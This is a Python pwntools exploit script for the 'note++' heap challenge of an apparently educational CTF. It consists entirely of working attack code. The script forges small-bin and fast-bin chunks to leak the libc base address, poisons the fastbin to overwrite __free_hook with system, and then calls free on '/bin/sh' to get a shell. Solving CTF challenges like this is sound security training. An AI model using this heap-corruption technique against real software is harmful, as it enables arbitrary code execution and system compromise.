#!/usr/bin/python3
from pwn import *
context.arch = 'amd64'

def add(size, note, desc, line=True):
    p.sendlineafter('>', str(1))
    p.sendlineafter(':', str(size))
    if line:
        p.sendlineafter(':', note)
        p.sendlineafter(':', desc)
    else:
        p.sendafter(':', note)
        p.sendafter(':', desc)

def showlist():
    p.sendlineafter('>', str(2))

def delete(idx):
    p.sendlineafter('>', str(3))
    p.sendlineafter(':', str(idx))

fake20 = 0x3c5728

# p = remote('edu-ctf.csie.org', 10181)
p = process('./note++-4420ae091f6beb0619b408c6b9410c52')
libc = ELF('./libc-2.23.so')

# Fake a small bin
add(0x10, b'a'*0xe, b'desc')
add(0x60, b'b'*0x5e, b'desc')
add(0x60, b'c'*0x5e, b'desc')
delete(0)
# raw_input('[?] Fake a small bin')
payload = b'd'*0x10
payload += p64(0) + p64(0x91)
payload += b'e'*0x80
payload += p64(0) + p64(0x51)
add(0x0, payload, b'desc')

# Free small bin
# raw_input('[?] Free small bin')
delete(1)

# Leak libc
delete(0)
payload = b'a' * 0x10
# raw_input('[?] Leak Libc')
add(0x0, payload, b'f'*48, line=False)
showlist()
p.recvuntil(b'Note 1:')
p.recvuntil(b'Data: ')
libc.address = u64(p.recv(6).ljust(8, b'\0')) - 0x3c4b78
info('libc.address: {}'.format(hex(libc.address)))

# Forge fast chunk, make a fake chunk that size is 0x70
add(0x10, b'r'*0xe, b'desc') # Note 3
add(0x10, b't'*0xe, b'desc')
add(0x40, b'a'*0x3e, b'desc')
add(0x10, b'w'*0xe, b'desc') # Note 6
add(0x60, b'x'*0x5e, b'desc')
delete(7)
delete(6)
payload = b'o' * 0x10
payload += p64(0) + p64(0x71)
payload += p64(libc.address + fake20 - 0x13)
# raw_input('[?] Forge fast chunk')
add(0x0, payload, b'desc')

# Get & Write fake chunk, preparing fake fast chunk (size: 0x20)
# raw_input('[?] Get fake chunk')
add(0x60, b'u'*0xe, b'desc') # Garbage
# raw_input('[?] Get fake chunk')
payload = b'a'*3 + p64(0) + p64(0x21)
add(0x60, payload, b'desc')
info('Forge a fake 0x20 fast chunk header at {}'.format(hex(libc.address + fake20)))

# Forge fast chunk
delete(4)
delete(3)
payload = b'j' * 0x10
payload += p64(0) + p64(0x21)
payload += p64(libc.address + fake20)
# raw_input('[?] Forge fast chunk')
add(0x0, payload, b'desc')

# Get & Write fake chunk, overwrite __free_hook
# raw_input('[?] Get fake chunk')
add(0x10, b'p'*0xe, b'desc') # Garbage
# raw_input('[?] Get fake chunk')
padding = libc.symbols['__free_hook'] - libc.address - fake20 - 0x10
payload = b'/bin/sh;'.ljust(padding, b'\x00')
payload += p64(libc.symbols['system'])
add(0x0, payload, b'desc')

# Call free('/bin/sh')
# raw_input('[?] free')
delete(9)

p.interactive()
